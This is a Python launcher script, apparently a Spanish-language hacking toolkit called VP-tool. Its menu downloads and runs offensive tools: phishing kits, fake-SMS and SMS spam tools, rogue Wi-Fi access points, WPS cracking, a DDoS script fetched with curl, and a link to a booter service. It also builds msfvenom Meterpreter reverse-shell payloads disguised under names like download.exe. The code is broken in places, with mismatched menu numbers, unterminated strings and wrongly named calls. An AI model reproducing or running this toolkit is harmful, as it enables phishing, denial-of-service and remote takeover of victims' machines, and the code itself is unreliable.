import os
import time
import json
import subprocess
import webbrowser
import socket

#   <--Return to Menu-->
def start_menu():
    os.system("clear")
    print(banner)
    print(decoracion)
#  <----comprobar IP---->
def comprIP():
    nombre_equipo = socket.gethostname()
    direccion_equipo = socket.gethostbyname(nombre_equipo)
    print("n-host" + nombre_equipo)
    print("IP:" + direccion_equipo)
    time.sleep(5)
    os.system("clear")
    decoracion()
    start_menu()
# <----Enviar sms falso---->
def fakesms():
    os.system("clear")
    print("banner")
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute Tool")
    print("              |                    3 -->> Exit")
    option = input("              ↳ ")
    if option == "1": 
        os.system("git clone https://github.com/Darkmux/DarkSMS")
        print("Downloaded!!!")
        time.sleep(1)
        while True:
            fakesms()
    if option == "2":
        os.system("mv DarkSMS/* .")
        os.system("cd DarkSMS")
        os.system("bash darksms.sh")
    if option == "3":
        os.system("clear")
        decoracion()
        start_menu()

#    <--Metasploit-->
def IPtracker():
        os.system("clear")
        red()
        print(banner)
        purple()
        print("              |                    1 -->> Download Tool")
        print("              |                    2 -->> Execute Tool")
        print("              |                    3 -->> Exit")
        option = input("              ↳ ")
        if option == "1":
            os.system("git clone https://github.com/JasonJerry/IPtracker")
            print("Download!!!")
            time.sleep(1)
            while True:
                IPtracker()
        if option == "2":
            os.system("mv IPtracker/* .")
            os.system("cd IPtracker")
            os.system("bash iptracker.sh")
        if option == "3":
            os.system("clear")
            decoracion()
            start_menu()
def msf():
    os.system("clear")
    print(banner)
    print("              |                    1 -->> Windows reverse shell")
    print("              |                    2 -->> Linux reverse shell x86")
    print("              |                    3 -->> Linux reverse shell x64")
    print("              |                    4 -->> Exit")
    option = input("              ↳ ")

    if option == "1":
        
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > download.exe")
        red()
        print("FileName == download.exe")
        time.sleep(2)
        while True:
            msf()

    if option == "2":
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->>")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx86.elf")
        red()
        print("FileName == downloadx86.elf")
        time.sleep(2)
        while True:
            msf()

    if option == "3":

        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx64.elf")
        red()
        time.sleep(2)
        print("FileName == downloadx64.elf")
        while True:
            msf()

    if option == "4":
        decoracion()
        start_menu()
def Ghostf():
        os.system("clear")
        print(banner)
        print("              |                    1 -->> Download Tool")
        print("              |                    2 -->> Execute Tool")
        print("              |                    3 -->> Exit\n")
        option = input("-->: ")
        if option == "1":
            os.system("git clone https://github.com/ParikhKadam/ghost-1")
            os.system("cd ghost-1")
            os.system("chmod +x install.sh")
            os.system("sudo bash install.sh")
            time.sleep(5)
            while True:
                Ghostf()
        if option == "2":
            os.system("./ghost")
        if option == "3":
            os.system("clear")
            start_menu()
def Goyscript():
        os.system("clear")
        purple()
        print(banner)
        print("              |                    1 -->> Download Tool")
        print("                                   2 -->> Execute Tool ")
        print("                                   3 -->> Exit         ")
        option = input("              ↳ ")
        if option == "1":
            os.system("git clone https://github.com/0x90/wps-scripts")
            yellow()
            print("Downloaded!!!")
            time.sleep(5)
            while True:
                Goyscript()
        if option == "2":
            os.system("cd wps-scripts/goyscript")
            os.system("chmod +x conectar.sh")
            os.system("sudo bash conectar.sh")
        if option == "3":
            os.system("clear")
            start_menu()
def phoneinfoga():
    os.system("clear")
    purple()
    print(banner)
    red()
    print("              |                    1 -->> Download Tool")
    print("                                   2 -->> Execute Tool ")
    print("                                   3 -->> Exit         ")
    option = input("              ↳ ")
    if option == "1":
        os.system("git clone https://github.com/sundowndev/PhoneInfoga")
        os.system("cd PhoneInfoga/")
        os.system("python3 -m pip install -r requirements.txt")
        purple()
        print("Downloaded!!")
        time.sleep(3)
        while True:
            phoneinfoga()
        
    if option == "2":
        os.system("cd PhoneInfoga/")
        print("the phoneinfoga commands are:python3 phoneinfoga scan +number")
        print("example: python3 phoneinfoga scan +36897153568")
    if option == "3":
        os.system("clear")
        decoracion()
        start_menu()
def ddos():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    option = input("              ↳ ")

    print("")
    if option == "1":
        yellow()
        print("")
        print("Downloading...")
        os.system("curl https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py -o ddos.py")
        red()
        print("Downloaded!!")
        time.sleep(2)
        while True:
            ddos()

    if option == "2":
        print("")
        os.system("python3 ddos.py")

    if option == "3":
        start_menu()
def freestresser():
    os.system("clear")
    purple()
    print(banner)
    red() 
    print("                                   1 -->> Web Tool")
    print("                                   2 -->> Exit                 ")
    option = input(" -->>")
    if option == "1":
        webbrowser.open_new("https://freestresser.to/")
    if option == "2":
        start_menu()
def Linset():
    os.system("clear")
    purple()
    print(banner)
    red() 
    print("                                   1 -->> Download Tool 1       ")
    print("                                   2 -->> download Tool 2 (utilizar desp de haber instalado el down 1")
    print("                                   3 -->> download Tool 3 (utilizar desp de haber instalado el down 2")
    print("                                   4 -->> Execute Tool          ")
    print("                                   5 -->> Exit                  ")
    option = input("              ↳ ")
    if option == "1":
        os.system("cd")
        os.system("git clone https://github.com/creadpag/linset.git ")
        os.system("sudo leafpad /etc/apt/sources.list")
        os.system("sudo deb http://ftp.de.debian.org/debian testing main contrib non-free")
        os.system("sudo deb http://ftp.debian.org/debian/ jessie-updates main contrib non-free")
        os.system("sudo deb http://security.debian.org/ jessie/updates main contrib non-free")
        time.sleep(5)
        while True:
            linset()
    if option == "2":
        os.system("apt-get update")
        os.system("apt-get upgrade")
        time.sleep(1)
        while True:
            linset()

    if option == "3":
        os.system("apt-get install isc-dhcp-server")
        os.system("apt-get install hostapd")
        os.system("apt-get install lighttpd")
        os.system("apt-get install Php5-cgi")
        time.sleep(5)
        os.system("clear")
        start_menu()
    if option == "4":
        os.system("cd")
        os.system(" cd linset")
        os.system("chmod +x linset")
        os.system("./linset")
    if option == "5":
        start_menu()
def phishing():
    os.system("clear")

    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    option = input("              ↳ ")

    print("")
    if option == "1":
        
        yellow()
        os.system("git clone https://github.com/htr-tech/zphisher")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            phishing()

    if option == "2":
        print("")
        os.system("mv zphisher/* .")
        os.system("mv zphisher/.sites .")
        os.system("bash zphisher.sh")

    if option == "3":
        os.system("clear")
        decoracion()
        start_menu()

def wpscan():
    os.system("clear")
    red()
    print(banner)
    blue()
    print("")
    purple()
    web = input("Web whith https:// -->> ")
    yellow()
    print("Do you want to save it on web.txt? y/n")
    if input("-->> ") == "y":
        os.system("wpscan --url "+web +">> web.txt")
        red()
        print("Saved!!")
        time.sleep(1)
        while True:
            start_menu()
    else:
        os.system("wpscan --url "+web)
        red()
        input("Press INTRO to exit")
        while True:
            decoracion()
            start_menu()

def eviltrust():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute Tool")
    print("              |                    3 -->> Exit")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/s4vitar/evilTrust")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            eviltrust()

    if option == "2":
        os.system("mv evilTrust/* .")
        os.system("clear")
        os.system("sudo bash evilTrust.sh -m terminal")

    if option == "3":
        decoracion()
        start_menu()

def sms():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute Tool")
    print("              |                    3 -->> Exit")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/Darkmux/SETSMS")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            sms()

    if option == "2":
        os.system("mv SETSMS/* .")
        os.system("chmod 777 SETSMS.sh")
        os.system("bash SETSMS.sh")

    if option == "3":
        decoracion()
        start_menu()

  
from sys import stdout

def red():
    RED = "\033[1;31m"
    stdout.write(RED)

def green():
    GREEN = "\033[0;32m"
    stdout.write(GREEN)


def blue():
    BLUE = "\033[1;34m"
    stdout.write(BLUE)

def yellow():
    YELLOW = "\033[1;33m"
    stdout.write(YELLOW)

def purple():
    PURPLE = "\033[1;35m"
    stdout.write(PURPLE)

def white():
    WHITE = "\033[1;37m"
    stdout.write(WHITE)



def decoracion():
    # hola
    print("1                 --comprobacion de ip")
    print("2                        --> IPtracker")
    print("3                         --> msfVenom")
    print("5                        --> goyscript")
    print("6                           --> ghostF")
    print("7                      --> phoneinfoga")
    print("9                             --> Ddos")
    print("9                      -->freestresser")
    print("10                          --> Linset")
    print("11                        --> Zphisher")
    print("12                       --> eviltrust")
    print("13                        --> Spam SMS")
    print("14                          -->FAKEsms")
    print("15                              --Exit")
    option = input("              +-> ")

    if option == "1":
        comprIP()
    if option == "2":
        IPtracker()
    if option == "3":
        msf()
    if option == "4":
        Goyscript()
    if option == "5":
        Ghostf()
    if option == "6":
        phoneinfoga()
    if option == "7":
        ddos()
    if option == "8":
        freestresser()
    if option == "9":
        Linset()
    if option == "10":
        phishing()
    if option == "11":
        eviltrust()
    if option == "12":
        sms()
    if option == "13
        fakesms()
    if option == "14:
        os.system("clear")
        exit()

banner = """
__     ______       _              _ 
\ \   / /  _ \     | |_ ___   ___ | | 
 \ \ / /| |_) |____| __/ _ \ / _ \| |
  \ V / |  __/_____| || (_) | (_) | |
   \_/  |_|         \__\___/ \___/|_|
                                     V
                                       2
"""
print(banner)

# <-- iniciar la tool -->
decoracion()
start_menu
